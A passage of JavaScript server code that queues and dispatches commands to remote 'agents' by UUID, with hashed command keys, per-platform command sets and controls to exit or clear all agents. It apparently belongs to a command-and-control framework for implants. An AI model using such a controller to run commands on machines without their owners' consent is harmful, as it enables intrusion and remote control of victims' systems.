					data['8bc92ae80d75eff6caedde5b9010a1f8'] = comm3['8bc92ae80d75eff6caedde5b9010a1f8'];
					comm3 = data;
				}
				fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(comm3));
				break;
			case "exit":
					let comm6 = {"4cc6791e40eaacf7aa591b48a397ae7c": `${data.split(' ')[1]}`}
					if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
						const data = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
						data['4cc6791e40eaacf7aa591b48a397ae7c'] = comm6['4cc6791e40eaacf7aa591b48a397ae7c'];
						comm6 = data;
					}
					fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(comm6));
					break;
		}
	}

	sendUpdate() {
		this.connections.sendAll(JSON.stringify(this.getState()));
	}

	getState() {
		fs.readdirSync('data/agents/').forEach(file => {
			let data = fs.readFileSync('data/agents/'+file);
			let agentUUID = file.split('.')[0];
			this.addAgent(agentUUID,JSON.parse(data));
		});
		return {'active_agents':this.activeAgents,'win32commands':this.commandsWin32,'win64commands':this.commandsWin64, 
				'linuxcommands':this.commandsLinux, 'darwincommands':this.commandsDarwin};
	}

	postUpdate(data) {
		const command = JSON.stringify(data).replace(/['"]+/g, '');
		if ('clear' === command.toLowerCase()) {
			this.delAllAgents();
		}
		else if ('exit_all' === command.toLowerCase()) {
			for (const agent in this.activeAgents) {
				this.run(agent,"exit 0");
			}
		}
		else if ('clear_agent' in data) {
			this.delAgent(data['clear_agent']);
		}
		else {
			this.run(data['agentUUID'],data['data']);
		}
		const returnData = {'send':'all'};
		returnData['active_agents'] = this.activeAgents;
		return returnData;
	}
}